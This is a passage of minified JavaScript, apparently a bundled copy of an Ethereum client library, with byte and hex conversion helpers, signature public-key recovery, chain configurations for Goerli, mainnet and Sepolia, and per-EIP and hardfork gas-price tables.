                    return (null !== (n = e.block) && void 0 !== n ? n : 1 / 0) - (null !== (r = t.block) && void 0 !== r ? r : 1 / 0)
                })), g.hardforks.sort(((e, t) => {
                    var n, r;
                    return (null !== (n = e.timestamp) && void 0 !== n ? n : p) - (null !== (r = t.timestamp) && void 0 !== r ? r : p)
                })), void 0 !== o.terminalTotalDifficulty) {
                const e = {
                        name: Cd.Merge,
                        ttd: o.terminalTotalDifficulty,
                        block: null
                    },
                    t = g.hardforks.findIndex((e => {
                        var t;
                        return !0 === (null === (t = v[e.name]) || void 0 === t ? void 0 : t.postMerge)
                    })); - 1 !== t ? g.hardforks.splice(t, 0, e) : g.hardforks.push(e)
            }
            const w = g.hardforks.length > 0 ? g.hardforks.slice(-1)[0] : void 0;
            return g.hardfork = null === w || void 0 === w ? void 0 : w.name, g.hardforks.unshift({
                name: Cd.Chainstart,
                block: 0
            }), g
        }

        function Rd(e) {
            let t = e;
            if ("string" !== typeof t) throw new Error("[padToEven] value must be type 'string', received ".concat(typeof t));
            return t.length % 2 && (t = "0".concat(t)), t
        }
        const Md = function(e) {
            var t;
            if (null === e || void 0 === e) return new Uint8Array;
            if (e instanceof Uint8Array) return e;
            if ("Uint8Array" === (null === (t = null === e || void 0 === e ? void 0 : e.constructor) || void 0 === t ? void 0 : t.name)) return Uint8Array.from(e);
            if (Array.isArray(e)) return Uint8Array.from(e);
            if ("string" === typeof e) {
                if (!Ia(e)) throw new Error("Cannot convert string to Uint8Array. only supports 0x-prefixed hex strings and this string was given: ".concat(e));
                return ks(Rd(Bd(e)))
            }
            if ("number" === typeof e) return Md(Cs(e));
            if ("bigint" === typeof e) {
                if (e < BigInt(0)) throw new Error("Cannot convert negative bigint to Uint8Array. Given: ".concat(e));
                let t = e.toString(16);
                return t.length % 2 && (t = "0".concat(t)), Md("0x".concat(t))
            }
            if (e.toArray) return Uint8Array.from(e.toArray());
            throw new Error("invalid type")
        };

        function jd(e) {
            const t = As(e);
            return "0x" === t ? BigInt(0) : BigInt(t)
        }
        const Fd = function(e) {
            return new Uint8Array(e).fill(0)
        };

        function Ld(e) {
            if (!ms(e)) {
                const t = "This method only supports Uint8Array but input was: ".concat(e);
                throw new Error(t)
            }
        }
        const Dd = function(e, t) {
            return Ld(e),
                function(e, t, n) {
                    const r = Fd(t);
                    return n ? e.length < t ? (r.set(e), r) : e.subarray(0, t) : e.length < t ? (r.set(e, t - e.length), r) : e.subarray(-t)
                }(e, t, !1)
        };
        const Hd = function(e) {
                return Ld(e),
                    function(e) {
                        let t = e[0];
                        for (; e.length > 0 && "0" === t.toString();) t = (e = e.slice(1))[0];
                        return e
                    }(e)
            },
            Ud = e => "0x".concat(e.toString(16));

        function zd(e) {
            return Hd(Md("0x".concat(e.toString(16))))
        }
        const Gd = function(e, t, n, r, i) {
            const o = function(e, t) {
                return e === BigInt(0) || e === BigInt(1) ? e : void 0 === t ? e - BigInt(27) : e - (t * BigInt(2) + BigInt(35))
            }(t, i);
            if (! function(e) {
                    return e === BigInt(0) || e === BigInt(1)
                }(o)) throw new Error("Invalid signature v value");
            return new wd.Signature(jd(n), jd(r)).addRecoveryBit(Number(o)).recoverPublicKey(e).toRawBytes(!1).slice(1)
        };

        function qd(e, t) {
            if (null === e) return null;
            if (void 0 === e) return;
            if ("string" === typeof e && !Ia(e)) throw new Error("A string must be provided with a 0x-prefix, given: ".concat(e));
            if ("number" === typeof e && !Number.isSafeInteger(e)) throw new Error("The provided number is greater than MAX_SAFE_INTEGER (please use an alternative input type)");
            const n = Md(e);
            switch (t) {
                case Td.Uint8Array:
                    return n;
                case Td.BigInt:
                    return jd(n);
                case Td.Number:
                    {
                        const e = jd(n);
                        if (e > BigInt(Number.MAX_SAFE_INTEGER)) throw new Error("The provided number is greater than MAX_SAFE_INTEGER (please use an alternative output type)");
                        return Number(e)
                    }
                case Td.PrefixedHexString:
                    return As(n);
                default:
                    throw new Error("unknown outputType")
            }
        }
        var Qd = n(576),
            Wd = n(31);
        const Vd = {
                name: "goerli",
                chainId: 5,
                networkId: 5,
                defaultHardfork: "merge",
                consensus: {
                    type: "poa",
                    algorithm: "clique",
                    clique: {
                        period: 15,
                        epoch: 3e4
                    }
                },
                comment: "Cross-client PoA test network",
                url: "https://github.com/goerli/testnet",
                genesis: {
                    timestamp: "0x5c51a607",
                    gasLimit: 10485760,
                    difficulty: 1,
                    nonce: "0x0000000000000000",
                    extraData: "0x22466c6578692069732061207468696e6722202d204166726900000000000000e0a2bd4258d2768837baa26a28fe71dc079f84c70000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
                },
                hardforks: [{
                    name: "chainstart",
                    block: 0,
                    forkHash: "0xa3f5ab08"
                }, {
                    name: "homestead",
                    block: 0,
                    forkHash: "0xa3f5ab08"
                }, {
                    name: "tangerineWhistle",
                    block: 0,
                    forkHash: "0xa3f5ab08"
                }, {
                    name: "spuriousDragon",
                    block: 0,
                    forkHash: "0xa3f5ab08"
                }, {
                    name: "byzantium",
                    block: 0,
                    forkHash: "0xa3f5ab08"
                }, {
                    name: "constantinople",
                    block: 0,
                    forkHash: "0xa3f5ab08"
                }, {
                    name: "petersburg",
                    block: 0,
                    forkHash: "0xa3f5ab08"
                }, {
                    name: "istanbul",
                    block: 1561651,
                    forkHash: "0xc25efa5c"
                }, {
                    name: "berlin",
                    block: 4460644,
                    forkHash: "0x757a1c47"
                }, {
                    name: "london",
                    block: 5062605,
                    forkHash: "0xb8c6299d"
                }, {
                    "//_comment": "The forkHash will remain same as mergeForkIdTransition is post merge, terminal block: https://goerli.etherscan.io/block/7382818",
                    name: "merge",
                    ttd: "10790000",
                    block: 7382819,
                    forkHash: "0xb8c6299d"
                }, {
                    name: "mergeForkIdTransition",
                    block: null,
                    forkHash: null
                }, {
                    name: "shanghai",
                    block: null,
                    forkHash: null
                }],
                bootstrapNodes: [],
                dnsNetworks: ["enrtree://AKA3AM6LPBYEUDMVNU3BSVQJ5AD45Y7YPOHJLEF6W26QOE4VTUDPE@all.goerli.ethdisco.net"]
            },
            Zd = {
                name: "mainnet",
                chainId: 1,
                networkId: 1,
                defaultHardfork: "merge",
                consensus: {
                    type: "pow",
                    algorithm: "ethash",
                    ethash: {}
                },
                comment: "The Ethereum main chain",
                url: "https://ethstats.net/",
                genesis: {
                    gasLimit: 5e3,
                    difficulty: 17179869184,
                    nonce: "0x0000000000000042",
                    extraData: "0x11bbe8db4e347b4e8c937c1c8370e4b5ed33adb3db69cbdb7a38e1e50b1b82fa"
                },
                hardforks: [{
                    name: "chainstart",
                    block: 0,
                    forkHash: "0xfc64ec04"
                }, {
                    name: "homestead",
                    block: 115e4,
                    forkHash: "0x97c2c34c"
                }, {
                    name: "dao",
                    block: 192e4,
                    forkHash: "0x91d1f948"
                }, {
                    name: "tangerineWhistle",
                    block: 2463e3,
                    forkHash: "0x7a64da13"
                }, {
                    name: "spuriousDragon",
                    block: 2675e3,
                    forkHash: "0x3edd5b10"
                }, {
                    name: "byzantium",
                    block: 437e4,
                    forkHash: "0xa00bc324"
                }, {
                    name: "constantinople",
                    block: 728e4,
                    forkHash: "0x668db0af"
                }, {
                    name: "petersburg",
                    block: 728e4,
                    forkHash: "0x668db0af"
                }, {
                    name: "istanbul",
                    block: 9069e3,
                    forkHash: "0x879d6e30"
                }, {
                    name: "muirGlacier",
                    block: 92e5,
                    forkHash: "0xe029e991"
                }, {
                    name: "berlin",
                    block: 12244e3,
                    forkHash: "0x0eb440f6"
                }, {
                    name: "london",
                    block: 12965e3,
                    forkHash: "0xb715077d"
                }, {
                    name: "arrowGlacier",
                    block: 13773e3,
                    forkHash: "0x20c327fc"
                }, {
                    name: "grayGlacier",
                    block: 1505e4,
                    forkHash: "0xf0afd0e3"
                }, {
                    "//_comment": "The forkHash will remain same as mergeForkIdTransition is post merge, terminal block: https://etherscan.io/block/15537393",
                    name: "merge",
                    ttd: "58750000000000000000000",
                    block: 15537394,
                    forkHash: "0xf0afd0e3"
                }, {
                    name: "mergeForkIdTransition",
                    block: null,
                    forkHash: null
                }, {
                    name: "shanghai",
                    block: null,
                    forkHash: null
                }],
                bootstrapNodes: [],
                dnsNetworks: ["enrtree://AKA3AM6LPBYEUDMVNU3BSVQJ5AD45Y7YPOHJLEF6W26QOE4VTUDPE@all.mainnet.ethdisco.net"]
            },
            Kd = {
                name: "sepolia",
                chainId: 11155111,
                networkId: 11155111,
                defaultHardfork: "merge",
                consensus: {
                    type: "pow",
                    algorithm: "ethash",
                    ethash: {}
                },
                comment: "PoW test network to replace Ropsten",
                url: "https://github.com/ethereum/go-ethereum/pull/23730",
                genesis: {
                    timestamp: "0x6159af19",
                    gasLimit: 3e7,
                    difficulty: 131072,
                    nonce: "0x0000000000000000",
                    extraData: "0x5365706f6c69612c20417468656e732c204174746963612c2047726565636521"
                },
                hardforks: [{
                    name: "chainstart",
                    block: 0,
                    forkHash: "0xfe3366e7"
                }, {
                    name: "homestead",
                    block: 0,
                    forkHash: "0xfe3366e7"
                }, {
                    name: "tangerineWhistle",
                    block: 0,
                    forkHash: "0xfe3366e7"
                }, {
                    name: "spuriousDragon",
                    block: 0,
                    forkHash: "0xfe3366e7"
                }, {
                    name: "byzantium",
                    block: 0,
                    forkHash: "0xfe3366e7"
                }, {
                    name: "constantinople",
                    block: 0,
                    forkHash: "0xfe3366e7"
                }, {
                    name: "petersburg",
                    block: 0,
                    forkHash: "0xfe3366e7"
                }, {
                    name: "istanbul",
                    block: 0,
                    forkHash: "0xfe3366e7"
                }, {
                    name: "muirGlacier",
                    block: 0,
                    forkHash: "0xfe3366e7"
                }, {
                    name: "berlin",
                    block: 0,
                    forkHash: "0xfe3366e7"
                }, {
                    name: "london",
                    block: 0,
                    forkHash: "0xfe3366e7"
                }, {
                    "//_comment": "The forkHash will remain same as mergeForkIdTransition is post merge, terminal block: https://sepolia.etherscan.io/block/1450408",
                    name: "merge",
                    ttd: "17000000000000000",
                    block: 1450409,
                    forkHash: "0xfe3366e7"
                }, {
                    name: "mergeForkIdTransition",
                    block: 1735371,
                    forkHash: "0xb96cbd13"
                }, {
                    name: "shanghai",
                    block: null,
                    timestamp: "1677557088",
                    forkHash: "0xf7f9bc08"
                }],
                bootstrapNodes: [],
                dnsNetworks: ["enrtree://AKA3AM6LPBYEUDMVNU3BSVQJ5AD45Y7YPOHJLEF6W26QOE4VTUDPE@all.sepolia.ethdisco.net"]
            },
            Jd = {
                1153: {
                    name: "EIP-1153",
                    number: 1153,
                    comment: "Transient Storage",
                    url: "https://eips.ethereum.org/EIPS/eip-1153",
                    status: "Review",
                    minimumHardfork: "chainstart",
                    requiredEIPs: [],
                    gasConfig: {},
                    gasPrices: {
                        tstore: {
                            v: 100,
                            d: "Base fee of the TSTORE opcode"
                        },
                        tload: {
                            v: 100,
                            d: "Base fee of the TLOAD opcode"
                        }
                    },
                    vm: {},
                    pow: {}
                },
                1559: {
                    name: "EIP-1559",
                    number: 1559,
                    comment: "Fee market change for ETH 1.0 chain",
                    url: "https://eips.ethereum.org/EIPS/eip-1559",
                    status: "Final",
                    minimumHardfork: "berlin",
                    requiredEIPs: [2930],
                    gasConfig: {
                        baseFeeMaxChangeDenominator: {
                            v: 8,
                            d: "Maximum base fee change denominator"
                        },
                        elasticityMultiplier: {
                            v: 2,
                            d: "Maximum block gas target elasticity"
                        },
                        initialBaseFee: {
                            v: 1e9,
                            d: "Initial base fee on first EIP1559 block"
                        }
                    },
                    gasPrices: {},
                    vm: {},
                    pow: {}
                },
                2315: {
                    name: "EIP-2315",
                    number: 2315,
                    comment: "Simple subroutines for the EVM",
                    url: "https://eips.ethereum.org/EIPS/eip-2315",
                    status: "Draft",
                    minimumHardfork: "istanbul",
                    gasConfig: {},
                    gasPrices: {
                        beginsub: {
                            v: 2,
                            d: "Base fee of the BEGINSUB opcode"
                        },
                        returnsub: {
                            v: 5,
                            d: "Base fee of the RETURNSUB opcode"
                        },
                        jumpsub: {
                            v: 10,
                            d: "Base fee of the JUMPSUB opcode"
                        }
                    },
                    vm: {},
                    pow: {}
                },
                2537: {
                    name: "EIP-2537",
                    number: 2537,
                    comment: "BLS12-381 precompiles",
                    url: "https://eips.ethereum.org/EIPS/eip-2537",
                    status: "Draft",
                    minimumHardfork: "chainstart",
                    gasConfig: {},
                    gasPrices: {
                        Bls12381G1AddGas: {
                            v: 600,
                            d: "Gas cost of a single BLS12-381 G1 addition precompile-call"
                        },
                        Bls12381G1MulGas: {
                            v: 12e3,
                            d: "Gas cost of a single BLS12-381 G1 multiplication precompile-call"
                        },
                        Bls12381G2AddGas: {
                            v: 4500,
                            d: "Gas cost of a single BLS12-381 G2 addition precompile-call"
                        },
                        Bls12381G2MulGas: {
                            v: 55e3,
                            d: "Gas cost of a single BLS12-381 G2 multiplication precompile-call"
                        },
                        Bls12381PairingBaseGas: {
                            v: 115e3,
                            d: "Base gas cost of BLS12-381 pairing check"
                        },
                        Bls12381PairingPerPairGas: {
                            v: 23e3,
                            d: "Per-pair gas cost of BLS12-381 pairing check"
                        },
                        Bls12381MapG1Gas: {
                            v: 5500,
                            d: "Gas cost of BLS12-381 map field element to G1"
                        },
                        Bls12381MapG2Gas: {
                            v: 11e4,
                            d: "Gas cost of BLS12-381 map field element to G2"
                        },
                        Bls12381MultiExpGasDiscount: {
                            v: [
                                [1, 1200],
                                [2, 888],
                                [3, 764],
                                [4, 641],
                                [5, 594],
                                [6, 547],
                                [7, 500],
                                [8, 453],
                                [9, 438],
                                [10, 423],
                                [11, 408],
                                [12, 394],
                                [13, 379],
                                [14, 364],
                                [15, 349],
                                [16, 334],
                                [17, 330],
                                [18, 326],
                                [19, 322],
                                [20, 318],
                                [21, 314],
                                [22, 310],
                                [23, 306],
                                [24, 302],
                                [25, 298],
                                [26, 294],
                                [27, 289],
                                [28, 285],
                                [29, 281],
                                [30, 277],
                                [31, 273],
                                [32, 269],
                                [33, 268],
                                [34, 266],
                                [35, 265],
                                [36, 263],
                                [37, 262],
                                [38, 260],
                                [39, 259],
                                [40, 257],
                                [41, 256],
                                [42, 254],
                                [43, 253],
                                [44, 251],
                                [45, 250],
                                [46, 248],
                                [47, 247],
                                [48, 245],
                                [49, 244],
                                [50, 242],
                                [51, 241],
                                [52, 239],
                                [53, 238],
                                [54, 236],
                                [55, 235],
                                [56, 233],
                                [57, 232],
                                [58, 231],
                                [59, 229],
                                [60, 228],
                                [61, 226],
                                [62, 225],
                                [63, 223],
                                [64, 222],
                                [65, 221],
                                [66, 220],
                                [67, 219],
                                [68, 219],
                                [69, 218],
                                [70, 217],
                                [71, 216],
                                [72, 216],
                                [73, 215],
                                [74, 214],
                                [75, 213],
                                [76, 213],
                                [77, 212],
                                [78, 211],
                                [79, 211],
                                [80, 210],
                                [81, 209],
                                [82, 208],
                                [83, 208],
                                [84, 207],
                                [85, 206],
                                [86, 205],
                                [87, 205],
                                [88, 204],
                                [89, 203],
                                [90, 202],
                                [91, 202],
                                [92, 201],
                                [93, 200],
                                [94, 199],
                                [95, 199],
                                [96, 198],
                                [97, 197],
                                [98, 196],
                                [99, 196],
                                [100, 195],
                                [101, 194],
                                [102, 193],
                                [103, 193],
                                [104, 192],
                                [105, 191],
                                [106, 191],
                                [107, 190],
                                [108, 189],
                                [109, 188],
                                [110, 188],
                                [111, 187],
                                [112, 186],
                                [113, 185],
                                [114, 185],
                                [115, 184],
                                [116, 183],
                                [117, 182],
                                [118, 182],
                                [119, 181],
                                [120, 180],
                                [121, 179],
                                [122, 179],
                                [123, 178],
                                [124, 177],
                                [125, 176],
                                [126, 176],
                                [127, 175],
                                [128, 174]
                            ],
                            d: "Discount gas costs of calls to the MultiExp precompiles with `k` (point, scalar) pair"
                        }
                    },
                    vm: {},
                    pow: {}
                },
                2565: {
                    name: "EIP-2565",
                    number: 2565,
                    comment: "ModExp gas cost",
                    url: "https://eips.ethereum.org/EIPS/eip-2565",
                    status: "Final",
                    minimumHardfork: "byzantium",
                    gasConfig: {},
                    gasPrices: {
                        modexpGquaddivisor: {
                            v: 3,
                            d: "Gquaddivisor from modexp precompile for gas calculation"
                        }
                    },
                    vm: {},
                    pow: {}
                },
                2718: {
                    name: "EIP-2718",
                    comment: "Typed Transaction Envelope",
                    url: "https://eips.ethereum.org/EIPS/eip-2718",
                    status: "Final",
                    minimumHardfork: "chainstart",
                    gasConfig: {},
                    gasPrices: {},
                    vm: {},
                    pow: {}
                },
                2929: {
                    name: "EIP-2929",
                    comment: "Gas cost increases for state access opcodes",
                    url: "https://eips.ethereum.org/EIPS/eip-2929",
                    status: "Final",
                    minimumHardfork: "chainstart",
                    gasConfig: {},
                    gasPrices: {
                        coldsload: {
                            v: 2100,
                            d: "Gas cost of the first read of storage from a given location (per transaction)"
                        },
                        coldaccountaccess: {
                            v: 2600,
                            d: "Gas cost of the first read of a given address (per transaction)"
                        },
                        warmstorageread: {
                            v: 100,
                            d: "Gas cost of reading storage locations which have already loaded 'cold'"
                        },
                        sstoreCleanGasEIP2200: {
                            v: 2900,
                            d: "Once per SSTORE operation from clean non-zero to something else"
                        },
                        sstoreNoopGasEIP2200: {
                            v: 100,
                            d: "Once per SSTORE operation if the value doesn't change"
                        },
                        sstoreDirtyGasEIP2200: {
                            v: 100,
                            d: "Once per SSTORE operation if a dirty value is changed"
                        },
                        sstoreInitRefundEIP2200: {
                            v: 19900,
                            d: "Once per SSTORE operation for resetting to the original zero value"
                        },
                        sstoreCleanRefundEIP2200: {
                            v: 4900,
                            d: "Once per SSTORE operation for resetting to the original non-zero value"
                        },
                        call: {
                            v: 0,
                            d: "Base fee of the CALL opcode"
                        },
                        callcode: {
                            v: 0,
                            d: "Base fee of the CALLCODE opcode"
                        },
                        delegatecall: {
                            v: 0,
                            d: "Base fee of the DELEGATECALL opcode"
                        },
                        staticcall: {
                            v: 0,
                            d: "Base fee of the STATICCALL opcode"
                        },
                        balance: {
                            v: 0,
                            d: "Base fee of the BALANCE opcode"
                        },
                        extcodesize: {
                            v: 0,
                            d: "Base fee of the EXTCODESIZE opcode"
                        },
                        extcodecopy: {
                            v: 0,
                            d: "Base fee of the EXTCODECOPY opcode"
                        },
                        extcodehash: {
                            v: 0,
                            d: "Base fee of the EXTCODEHASH opcode"
                        },
                        sload: {
                            v: 0,
                            d: "Base fee of the SLOAD opcode"
                        },
                        sstore: {
                            v: 0,
                            d: "Base fee of the SSTORE opcode"
                        }
                    },
                    vm: {},
                    pow: {}
                },
                2930: {
                    name: "EIP-2930",
                    comment: "Optional access lists",
                    url: "https://eips.ethereum.org/EIPS/eip-2930",
                    status: "Final",
                    minimumHardfork: "istanbul",
                    requiredEIPs: [2718, 2929],
                    gasConfig: {},
                    gasPrices: {
                        accessListStorageKeyCost: {
                            v: 1900,
                            d: "Gas cost per storage key in an Access List transaction"
                        },
                        accessListAddressCost: {
                            v: 2400,
                            d: "Gas cost per storage key in an Access List transaction"
                        }
                    },
                    vm: {},
                    pow: {}
                },
                3198: {
                    name: "EIP-3198",
                    number: 3198,
                    comment: "BASEFEE opcode",
                    url: "https://eips.ethereum.org/EIPS/eip-3198",
                    status: "Final",
                    minimumHardfork: "london",
                    gasConfig: {},
                    gasPrices: {
                        basefee: {
                            v: 2,
                            d: "Gas cost of the BASEFEE opcode"
                        }
                    },
                    vm: {},
                    pow: {}
                },
                3529: {
                    name: "EIP-3529",
                    comment: "Reduction in refunds",
                    url: "https://eips.ethereum.org/EIPS/eip-3529",
                    status: "Final",
                    minimumHardfork: "berlin",
                    requiredEIPs: [2929],
                    gasConfig: {
                        maxRefundQuotient: {
                            v: 5,
                            d: "Maximum refund quotient; max tx refund is min(tx.gasUsed/maxRefundQuotient, tx.gasRefund)"
                        }
                    },
                    gasPrices: {
                        selfdestructRefund: {
                            v: 0,
                            d: "Refunded following a selfdestruct operation"
                        },
                        sstoreClearRefundEIP2200: {
                            v: 4800,
                            d: "Once per SSTORE operation for clearing an originally existing storage slot"
                        }
                    },
                    vm: {},
                    pow: {}
                },
                3540: {
                    name: "EIP-3540",
                    number: 3540,
                    comment: "EVM Object Format (EOF) v1",
                    url: "https://eips.ethereum.org/EIPS/eip-3540",
                    status: "Review",
                    minimumHardfork: "london",
                    requiredEIPs: [3541],
                    gasConfig: {},
                    gasPrices: {},
                    vm: {},
                    pow: {}
                },
                3541: {
                    name: "EIP-3541",
                    comment: "Reject new contracts starting with the 0xEF byte",
                    url: "https://eips.ethereum.org/EIPS/eip-3541",
                    status: "Final",
                    minimumHardfork: "berlin",
                    requiredEIPs: [],
                    gasConfig: {},
                    gasPrices: {},
                    vm: {},
                    pow: {}
                },
                3554: {
                    name: "EIP-3554",
                    comment: "Reduction in refunds",
                    url: "Difficulty Bomb Delay to December 1st 2021",
                    status: "Final",
                    minimumHardfork: "muirGlacier",
                    requiredEIPs: [],
                    gasConfig: {},
                    gasPrices: {},
                    vm: {},
                    pow: {
                        difficultyBombDelay: {
                            v: 95e5,
                            d: "the amount of blocks to delay the difficulty bomb with"
                        }
                    }
                },
                3607: {
                    name: "EIP-3607",
                    number: 3607,
                    comment: "Reject transactions from senders with deployed code",
                    url: "https://eips.ethereum.org/EIPS/eip-3607",
                    status: "Final",
                    minimumHardfork: "chainstart",
                    requiredEIPs: [],
                    gasConfig: {},
                    gasPrices: {},
                    vm: {},
                    pow: {}
                },
                3651: {
                    name: "EIP-3651",
                    number: 3198,
                    comment: "Warm COINBASE",
                    url: "https://eips.ethereum.org/EIPS/eip-3651",
                    status: "Review",
                    minimumHardfork: "london",
                    requiredEIPs: [2929],
                    gasConfig: {},
                    gasPrices: {},
                    vm: {},
                    pow: {}
                },
                3670: {
                    name: "EIP-3670",
                    number: 3670,
                    comment: "EOF - Code Validation",
                    url: "https://eips.ethereum.org/EIPS/eip-3670",
                    status: "Review",
                    minimumHardfork: "london",
                    requiredEIPs: [3540],
                    gasConfig: {},
                    gasPrices: {},
                    vm: {},
                    pow: {}
                },
                3675: {
                    name: "EIP-3675",
                    number: 3675,
                    comment: "Upgrade consensus to Proof-of-Stake",
                    url: "https://eips.ethereum.org/EIPS/eip-3675",
                    status: "Final",
                    minimumHardfork: "london",
                    requiredEIPs: [],
                    gasConfig: {},
                    gasPrices: {},
                    vm: {},
                    pow: {}
                },
                3855: {
                    name: "EIP-3855",
                    number: 3855,
                    comment: "PUSH0 instruction",
                    url: "https://eips.ethereum.org/EIPS/eip-3855",
                    status: "Review",
                    minimumHardfork: "chainstart",
                    requiredEIPs: [],
                    gasConfig: {},
                    gasPrices: {
                        push0: {
                            v: 2,
                            d: "Base fee of the PUSH0 opcode"
                        }
                    },
                    vm: {},
                    pow: {}
                },
                3860: {
                    name: "EIP-3860",
                    number: 3860,
                    comment: "Limit and meter initcode",
                    url: "https://eips.ethereum.org/EIPS/eip-3860",
                    status: "Review",
                    minimumHardfork: "spuriousDragon",
                    requiredEIPs: [],
                    gasConfig: {},
                    gasPrices: {
                        initCodeWordCost: {
                            v: 2,
                            d: "Gas to pay for each word (32 bytes) of initcode when creating a contract"
                        }
                    },
                    vm: {
                        maxInitCodeSize: {
                            v: 49152,
                            d: "Maximum length of initialization code when creating a contract"
                        }
                    },
                    pow: {}
                },
                4345: {
                    name: "EIP-4345",
                    number: 4345,
                    comment: "Difficulty Bomb Delay to June 2022",
                    url: "https://eips.ethereum.org/EIPS/eip-4345",
                    status: "Final",
                    minimumHardfork: "london",
                    gasConfig: {},
                    gasPrices: {},
                    vm: {},
                    pow: {
                        difficultyBombDelay: {
                            v: 107e5,
                            d: "the amount of blocks to delay the difficulty bomb with"
                        }
                    }
                },
                4399: {
                    name: "EIP-4399",
                    number: 4399,
                    comment: "Supplant DIFFICULTY opcode with PREVRANDAO",
                    url: "https://eips.ethereum.org/EIPS/eip-4399",
                    status: "Review",
                    minimumHardfork: "london",
                    requiredEIPs: [],
                    gasConfig: {},
                    gasPrices: {},
                    vm: {},
                    pow: {}
                },
                5133: {
                    name: "EIP-5133",
                    number: 5133,
                    comment: "Delaying Difficulty Bomb to mid-September 2022",
                    url: "https://eips.ethereum.org/EIPS/eip-5133",
                    status: "Draft",
                    minimumHardfork: "grayGlacier",
                    gasConfig: {},
                    gasPrices: {},
                    vm: {},
                    pow: {
                        difficultyBombDelay: {
                            v: 114e5,
                            d: "the amount of blocks to delay the difficulty bomb with"
                        }
                    }
                }
            },
            Yd = {
                chainstart: {
                    name: "chainstart",
                    comment: "Start of the Ethereum main chain",
                    url: "",
                    status: "",
                    gasConfig: {
                        minGasLimit: {
                            v: 5e3,
                            d: "Minimum the gas limit may ever be"
                        },
                        gasLimitBoundDivisor: {
                            v: 1024,
                            d: "The bound divisor of the gas limit, used in update calculations"
                        },
                        maxRefundQuotient: {
                            v: 2,
                            d: "Maximum refund quotient; max tx refund is min(tx.gasUsed/maxRefundQuotient, tx.gasRefund)"
                        }
                    },
                    gasPrices: {
                        base: {
                            v: 2,
                            d: "Gas base cost, used e.g. for ChainID opcode (Istanbul)"
                        },
                        tierStep: {
                            v: [0, 2, 3, 5, 8, 10, 20],
                            d: "Once per operation, for a selection of them"
                        },
                        exp: {
                            v: 10,
                            d: "Base fee of the EXP opcode"
                        },
                        expByte: {
                            v: 10,
                            d: "Times ceil(log256(exponent)) for the EXP instruction"
                        },
                        sha3: {
                            v: 30,
                            d: "Base fee of the SHA3 opcode"
                        },
                        sha3Word: {
                            v: 6,
                            d: "Once per word of the SHA3 operation's data"
                        },
                        sload: {
                            v: 50,
                            d: "Base fee of the SLOAD opcode"
                        },
                        sstoreSet: {
                            v: 2e4,
                            d: "Once per SSTORE operation if the zeroness changes from zero"
                        },
                        sstoreReset: {
                            v: 5e3,
                            d: "Once per SSTORE operation if the zeroness does not change from zero"
                        },
                        sstoreRefund: {
                            v: 15e3,
                            d: "Once per SSTORE operation if the zeroness changes to zero"
                        },
                        jumpdest: {
                            v: 1,
                            d: "Base fee of the JUMPDEST opcode"
                        },
                        log: {
                            v: 375,
                            d: "Base fee of the LOG opcode"
                        },
                        logData: {
                            v: 8,
                            d: "Per byte in a LOG* operation's data"
                        },
                        logTopic: {
                            v: 375,
                            d: "Multiplied by the * of the LOG*, per LOG transaction. e.g. LOG0 incurs 0 * c_txLogTopicGas, LOG4 incurs 4 * c_txLogTopicGas"
                        },
                        create: {
                            v: 32e3,
                            d: "Base fee of the CREATE opcode"
                        },
                        call: {
                            v: 40,
                            d: "Base fee of the CALL opcode"
                        },
                        callStipend: {
                            v: 2300,
                            d: "Free gas given at beginning of call"
                        },
                        callValueTransfer: {
                            v: 9e3,
                            d: "Paid for CALL when the value transfor is non-zero"
                        },
                        callNewAccount: {
                            v: 25e3,
                            d: "Paid for CALL when the destination address didn't exist prior"
                        },
                        selfdestructRefund: {
                            v: 24e3,
                            d: "Refunded following a selfdestruct operation"
                        },
                        memory: {
                            v: 3,
                            d: "Times the address of the (highest referenced byte in memory + 1). NOTE: referencing happens on read, write and in instructions such as RETURN and CALL"
                        },
                        quadCoeffDiv: {
                            v: 512,
                            d: "Divisor for the quadratic particle of the memory cost equation"
                        },
                        createData: {
                            v: 200,
                            d: ""
                        },
                        tx: {
                            v: 21e3,
                            d: "Per transaction. NOTE: Not payable on data of calls between transactions"
                        },
                        txCreation: {
                            v: 32e3,
                            d: "The cost of creating a contract via tx"
                        },
                        txDataZero: {
                            v: 4,
                            d: "Per byte of data attached to a transaction that equals zero. NOTE: Not payable on data of calls between transactions"
                        },
                        txDataNonZero: {
                            v: 68,
                            d: "Per byte of data attached to a transaction that is not equal to zero. NOTE: Not payable on data of calls between transactions"
                        },
                        copy: {
                            v: 3,
                            d: "Multiplied by the number of 32-byte words that are copied (round up) for any *COPY operation and added"
                        },
                        ecRecover: {
                            v: 3e3,
                            d: ""
                        },
                        sha256: {
                            v: 60,
                            d: ""
                        },
                        sha256Word: {
                            v: 12,
                            d: ""
                        },
                        ripemd160: {
                            v: 600,
                            d: ""
                        },
                        ripemd160Word: {
                            v: 120,
                            d: ""
                        },
                        identity: {
                            v: 15,
                            d: ""
                        },
                        identityWord: {
                            v: 3,
                            d: ""
                        },
                        stop: {
                            v: 0,
                            d: "Base fee of the STOP opcode"
                        },
                        add: {
                            v: 3,
                            d: "Base fee of the ADD opcode"
                        },
                        mul: {
                            v: 5,
                            d: "Base fee of the MUL opcode"
                        },
                        sub: {
                            v: 3,
                            d: "Base fee of the SUB opcode"
                        },
                        div: {
                            v: 5,
                            d: "Base fee of the DIV opcode"
                        },
                        sdiv: {
                            v: 5,
                            d: "Base fee of the SDIV opcode"
                        },
                        mod: {
                            v: 5,
                            d: "Base fee of the MOD opcode"
                        },
                        smod: {
                            v: 5,
                            d: "Base fee of the SMOD opcode"
                        },
                        addmod: {
                            v: 8,
                            d: "Base fee of the ADDMOD opcode"
                        },
                        mulmod: {
                            v: 8,
                            d: "Base fee of the MULMOD opcode"
                        },
                        signextend: {
                            v: 5,
                            d: "Base fee of the SIGNEXTEND opcode"
                        },
                        lt: {
                            v: 3,
                            d: "Base fee of the LT opcode"
                        },
                        gt: {
                            v: 3,
                            d: "Base fee of the GT opcode"
                        },
                        slt: {
                            v: 3,
                            d: "Base fee of the SLT opcode"
                        },
                        sgt: {
                            v: 3,
                            d: "Base fee of the SGT opcode"
                        },
                        eq: {
                            v: 3,
                            d: "Base fee of the EQ opcode"
                        },
                        iszero: {
                            v: 3,
                            d: "Base fee of the ISZERO opcode"
                        },
                        and: {
                            v: 3,
                            d: "Base fee of the AND opcode"
                        },
                        or: {
                            v: 3,
                            d: "Base fee of the OR opcode"
                        },
                        xor: {
                            v: 3,
                            d: "Base fee of the XOR opcode"
                        },
                        not: {
                            v: 3,
                            d: "Base fee of the NOT opcode"
                        },
                        byte: {
                            v: 3,
                            d: "Base fee of the BYTE opcode"
                        },
